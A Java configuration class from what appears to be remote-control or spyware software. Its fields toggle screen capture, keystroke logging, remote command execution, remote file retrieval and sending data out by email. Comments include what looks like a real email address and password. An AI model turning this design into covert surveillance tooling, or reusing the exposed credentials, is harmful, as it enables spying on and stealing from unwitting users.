package com.topking.ftp.bean;

public class ConfigBean {

	private boolean unInstall = false; // 卸载开关
	private boolean screenCapture = true; // 截屏开关，默认关闭
	private boolean screenTimeCapture = false; // 截屏时间开关
	private String intervelscreenTime = "30"; // 间隔时间
	private boolean keyBoard = false; // 键盘开关
	private String intervelTime = "60"; // 间隔时间
	private String commandStr; // 执行命令
	private boolean logkey = false;//直接获取键盘记录
	private String remoteFilePath; // 文件获取路径
	private String emailURL = "";//seclabmac@163.com"; // 执行命令
	private String emailName = "";//seclabmac"; // 执行命令
	private String emailPassWD = "";//lab605607"; // 执行命令
	private String emailAttachment; // 执行命令

	public boolean getUnInstall() {
		return unInstall;
	}

	public void setUnInstall(boolean ui) {
		this.unInstall = ui;
	}

	public boolean getScreenCapture() {
		return screenCapture;
	}

	public void setScreenCapture(boolean sc) {
		this.screenCapture = sc;
	}

	public boolean getScreenTimeCapture() {
		return screenTimeCapture;
	}

	public void setScreenTimeCapture(boolean stc) {
		this.screenTimeCapture = stc;
	}

	public String getIntervelScreenTime() {
		return intervelscreenTime;
	}

	public void setIntervelScreenTime(String ist) {
		this.intervelscreenTime = ist;
	}

	public boolean getKeyBoard() {
		return keyBoard;
	}

	public void setKeyBoard(boolean kb) {
		this.keyBoard = kb;
	}

	public String getIntervelTime() {
		return intervelTime;
	}

	public void setIntervelTime(String it) {
		this.intervelTime = it;
	}

	public String getCommandStr() {
		return commandStr;
	}

	public void setCommandStr(String str) {
		this.commandStr = str;
	}

	public String getRemoteFilePath() {
		return remoteFilePath;
	}

	public void setRemoteFilePath(String rfp) {
		this.remoteFilePath = rfp;
	}

	public boolean getLogKey() {
		return logkey;
	}

	public void setLogKey(boolean lk) {
		this.logkey = lk;
	}

	public String getEmailURL() {
		return emailURL;
	}

	public void setEmailURL(String eurl) {
		this.emailURL = eurl;
	}

	public String getEmailName() {
		return emailName;
	}

	public void setEmailName(String ename) {
		this.emailName = ename;
	}

	public String getEmailPassWD() {
		return emailPassWD;
	}

	public void setEmailPassWD(String epwd) {
		this.emailPassWD = epwd;
	}

	public String getEmailAttachment() {
		return emailAttachment;
	}

	public void setEmailAttachment(String ea) {
		this.emailAttachment = ea;
	}

	public String toString() {
		String cfbStr = "";
		String unInstall = "false";
		if (this.getUnInstall())
			unInstall = "true";
		String screen = "false";
		if (this.getScreenCapture())
			screen = "true";
		String timescreen = "false";
		if (this.getScreenTimeCapture())
			timescreen = "true";
		String key = "false";
		if (this.getKeyBoard())
			key = "true";
		/*String logkey = "false";
		if (this.getLogKey())
			logkey = "true";*/
		cfbStr = unInstall + "#" + screen + "#" + timescreen + "#" + key + "#"
				+ this.logkey + "#" + this.intervelTime + "#"
				+ this.intervelscreenTime + "#" + this.commandStr + "#"
				+ this.remoteFilePath + "#" + this.emailURL + "#"
				+ this.emailName + "#" + this.emailPassWD + "#"
				+ this.emailAttachment;
		return cfbStr;
	}
}
